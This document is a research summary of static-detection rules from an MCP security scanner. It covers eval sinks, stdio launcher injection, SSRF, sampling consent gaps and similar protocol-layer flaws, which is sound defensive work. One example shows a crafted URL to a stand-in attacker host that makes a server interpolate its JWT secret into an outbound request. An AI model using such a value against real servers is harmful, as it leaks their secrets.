---
type: Research
title: agent-audit-kit — MCP Protocol-Layer Security Patterns
description: Statically-detectable MCP protocol-layer vulnerability patterns distilled from agent-audit-kit's scanner suite — unsafe eval sinks, stdio launcher injection, env-placeholder secret exfiltration, SSRF via tool/config destinations, sampling consent gaps, unbounded tool catalogues, routable-header desync, discovery/execution gate asymmetry, and marketplace-fetch-to-spawn correlation.
tags: [research, mcp, ssrf, rce, injection, secrets]
timestamp: "2026-09-22T00:00:00+08:00"
---

# agent-audit-kit — MCP Protocol-Layer Security Patterns

## What this covers

agent-audit-kit is a static scanner purpose-built for MCP/agent codebases — 357 rules across 14
categories, distinguished from generic SAST by its focus on MCP-protocol-specific shapes: the
`tools/list`/`tools/call` handler pair, stdio server launch configuration, the `sampling`
capability, and the SEP-2243 routable-header extension. This document distills the patterns from
its scanner suite that map onto statically-detectable source/config shapes.

## Code execution via tool-handler parameters

| Pattern | What it catches | Detection approach |
|---|---|---|
| MCP tool handler routes a parameter through `eval`/`exec`/`compile`/`__import__` | A tool-parameter value reaching a Python code-execution primitive with no local/global namespace pinning — the interpreter equivalent of `eval()` on attacker-influenceable input | AST: a function decorated as an MCP tool handler, whose parameter reaches a code-execution sink on the same line |
| SymPy `parse_expr()` with no `local_dict`/`global_dict` pinning | SymPy's own documentation states unpinned `parse_expr()` on untrusted input is equivalent to `eval()` — a real-world "math expression evaluator" MCP tool hit exactly this shape | Same taint check, additionally requiring BOTH pinning kwargs to be present to silence it |
| Stdio launcher combined with an inline-code-execution flag | A server's `command` resolves to a shell-style launcher (`npx`/`node`/`bash`/`sh`/`python`) that is otherwise a legitimate MCP stdio launcher shape — but `args` carries `-c`/`-e`/`--eval`, making the args array itself the executed payload rather than a path to a reviewable file | JSON structural walk correlating `command` with its sibling `args` array against a curated launcher + flag set |
| Non-pinned template/interpolation token in stdio launcher argv | A `${...}` embedded in a larger string (not a standalone env reference), `{{...}}`, or `%s` in a stdio server's `args` — the actual argv content at spawn time is not what a reviewer reads in the config file | Per-token check across all launcher types, independent of the inline-flag check above |

## Secret exfiltration via environment placeholder resolution

| Pattern | What it catches | Detection approach |
|---|---|---|
| Resolving `${VAR}`/`$VAR` placeholders in a user-supplied config value against the process environment | An MCP server that expands environment-variable placeholders found INSIDE a caller-supplied string (typically a server URL) leaks its own secrets — a caller submits `https://attacker.example/?k=${JWT_SECRET}` and the server interpolates its own secret into the outbound request | Python: `os.path.expandvars()`/`.format(**os.environ)`; TS/JS: a `.replace()` call whose replacer reads `process.env` — both gated to files that reference the MCP protocol at all |

This is a different taint direction from a generic secret-in-config-file check: no secret is
ever hardcoded anywhere in the source; the leak only happens at runtime, driven by attacker
input reaching a placeholder-expansion call that was written for trusted operator config.

## Server-side request forgery via MCP-specific taint sources

| Pattern | What it catches | Detection approach |
|---|---|---|
| MCP tool-handler URL-shaped parameter reaches an outbound fetch | A tool parameter named `url`/`endpoint`/`target`/`uri`/`link`/`href`/`webhook`/`callback` (or a `*_url` variant) flows into `requests`/`httpx`/`urllib`/`aiohttp` with no host/scheme allow-list anywhere in the handler | AST taint: parameter → fetch sink, with simple same-function assignment propagation |
| MCP-config destination reaches an outbound fetch | A configuration-shaped name (`server_url`, `webhook_url`, `mcp_server_url`, and similar — deliberately not bare `url` or `base_url`, which is typically a service's own fixed address) reaches a fetch call with no allow-list guard recognized anywhere in the module | AST walk over fetch-sink call arguments, checking for a curated destination-name vocabulary |

Both patterns are deliberately narrower than a generic SSRF check: an MCP tool-handler's
bare-variable URL argument is a genuinely higher-risk shape than the same pattern in ordinary
backend code, since the parameter typically arrives straight from the calling MCP client with no
intermediate validation step at all.

## MCP sampling capability without a consent gate

| Pattern | What it catches | Detection approach |
|---|---|---|
| `sampling` capability implemented with no consent/elicitation marker anywhere in the repo | MCP servers can request LLM completions back through the connected client (`sampling/createMessage`) — this inverts the usual trust direction, making the server a privileged caller of the host's own LLM. The protocol's own consent flow (`elicitation/create`) exists specifically to gate this | Repo-wide marker search: sampling-participation markers present, consent markers absent anywhere in the repo |
| MCP config declares `sampling` in a server's capabilities with no consent sibling flag | An explicit host-side capability allow-list that never wires in a consent requirement | JSON structural check on MCP config files |

## Uncontrolled resource consumption from an upstream MCP server

| Pattern | What it catches | Detection approach |
|---|---|---|
| Tool catalogue assembled from an unbounded upstream `tools/list` response | An MCP aggregator that asks each configured server for its tools with no cap on count or per-tool schema size — the allocation is the upstream's choice, not the aggregator's | Same-file co-occurrence: a discovery-site marker, a remote-response source, accumulation into a collection, with no bound signal (a slice, length check, or loop break) present anywhere |

This is architecturally the inverse of an inbound-request-body-size check: it bounds what an
UPSTREAM sends back when the scanned code acts as an MCP client, not what a caller sends in.

## SEP-2243 routable-header confused-deputy risk

| Pattern | What it catches | Detection approach |
|---|---|---|
| `Mcp-Method`/`Mcp-Name` routable header used for routing with no body cross-check | The MCP spec's routable-header extension lets a gateway route/authorize a request from the HTTP header alone, without parsing the JSON-RPC body — a header/body desync lets a caller pass the gateway's routing gate as one method while the body actually invokes another | Same-file co-occurrence: header read + routing/authorization use, with no cross-check against the body's own method field |

## Tool-gate enforcement asymmetry

| Pattern | What it catches | Detection approach |
|---|---|---|
| A tool gate (allowlist/read-only/non-destructive) enforced in the `tools/list` discovery handler but absent from the `tools/call` execution handler | Discovery-only enforcement controls what a client SEES, not what it can DO — a client that already knows a restricted tool's name calls it directly and bypasses the gate entirely | Per-handler classification (by name/decorator) + gate-marker presence check, comparing discovery vs. execution handlers in the same file |

## Marketplace-fetch-to-spawn correlation

| Pattern | What it catches | Detection approach |
|---|---|---|
| A network fetch feeds directly into an MCP stdio server spawn in the same function | An MCP client that fetches a server manifest from a marketplace/registry and spawns a stdio server directly from the response — the fetch response becomes the exec target, with no verification step between them. A marketplace compromise becomes client-side RCE on every consumer at the next refresh | Python: same-function call-sequence walk (a fetch call followed by a stdio-spawn call); TS/JS: a bounded lookahead window after `await fetch(...)` for a `new Stdio*Transport(...)` construction |

## Coverage summary

| Category | Detection technique | Coverage |
|---|---|---|
| Unsafe code-execution sinks | AST taint (decorator-scoped) | `eval`/`exec`/`compile`/`__import__`/unpinned SymPy `parse_expr` on a tool-handler parameter are covered; indirect access via `getattr`/aliasing is not |
| Stdio launcher injection | JSON structural walk | A curated launcher + inline-flag set, and any-launcher template-token check, are covered; an unlisted interpreter or a dynamically-constructed flag is not |
| Env-placeholder exfiltration | Cross-language regex, MCP-context gated | The stdlib/idiomatic expansion calls are covered; a hand-rolled placeholder resolver is not |
| SSRF via MCP taint sources | AST taint | A curated parameter-name and config-key vocabulary is covered; an unlisted name or cross-function taint is not |
| Sampling consent gap | Repo-wide marker search | The curated sampling/consent marker vocabularies are covered; a consent flow enforced entirely in a separate host-application repo is structurally invisible to a single-repo scan |
| Unbounded tool catalogue | Co-occurrence + bound-absence | The discovery/remote-source/accumulation/bound signal sets are covered; a bound applied in a helper function in a different file is not |
| Routable-header desync | Co-occurrence, cross-language regex | The curated header-read/routing-use/body-crosscheck vocabularies are covered; cross-file header/body handling is not |
| Toolgate asymmetry | AST (Python) + region-sliced regex (TS/JS) | Same-file discovery/execution handler pairs are covered; a cross-file handler split is not |
| Marketplace-fetch-to-spawn | Call-sequence heuristic | Same-function fetch-then-spawn ordering is covered; this is an ordering heuristic, not a data-flow proof the spawn's arguments derive from the fetch |
